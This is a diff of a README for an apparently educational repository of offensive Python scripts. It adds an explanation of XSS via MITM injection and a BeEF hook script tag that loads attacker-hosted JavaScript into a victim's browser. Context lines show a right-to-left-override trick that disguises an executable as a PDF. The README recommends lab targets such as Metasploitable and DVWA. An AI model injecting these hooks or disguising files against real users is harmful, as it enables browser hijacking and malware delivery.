@@ -36,9 +36,16 @@ On Windows, while having both Python 2 and 3 installed, we can force to run eith
 `py -<version> <name_of_script_file>`  
 where `<version>` can be '2' or '3'.
 
-### BeEF
-The code we want to inject into our victim is:  
-`<script src="http://<IP>:3000/hook.js"></script`,  
+### XSS (BeEF)
+Few of the scripts use [Cross Site Scripting](https://en.wikipedia.org/wiki/Cross-site_scripting) (XSS).
+One of them does that through MIDM attack and with `code_injector.py`. The other one in `vulnerability_scanner.py`.
+To put it shortly, XSS is a type of attack that injects JavaScript code into user's web browser,
+used while visiting targeted web server.
+There are few ways of performing such attacks and I recommend further reading to anyone interested.
+Just remember that while we use scanner to find vulnerabilities, BeEF is used to exploit them.
+
+The code we want to inject into client web browser is:  
+`<script src="http://<IP>:3000/hook.js"></script>`,  
 where `<IP>` is the IP of your host server containing *hook.js*.
 
 If you are using a HTTP server, make sure insert the code snippet above
@@ -131,7 +138,7 @@ research-on-human-reflexes.exe
 research-on-human-refl‮fdp.exe
 ```
 Remember that such file needs to be compressed into a .zip file or similar,
-since direct download will cause this character to be removed in the process.  
+since direct download will cause this character to be removed in the process.
 
 ## Tips & Tricks
 * It seems that *netfilterqueue* does not work on Python 3.x.  
@@ -145,7 +152,7 @@ on the web and use it instead of creating your own that most likely won't be as 
 since such action against third-party server is most likely illegal in most of the countries.
 * Remember to crawl websites responsibly.
 Refer to `robots.txt` file, do not throttle the server you are crawling and preferably,
-ask the owner of the server for permission. It's highly recommended to use Metasploitable machine for those purposes.  
-
-
-
+ask the owner of the server for permission. It's highly recommended to use Metasploitable machine for those purposes. 
+* You can modify some stuff (such as max length of message on DVWA website) by using "Inspect Element" in your browser
+and changing the values as you want.  
+* To change default security level of DVWA (Metasploit), edit the `/var/www/dvwa/dvwa/includes/dvwaPage.inc.php` file.  
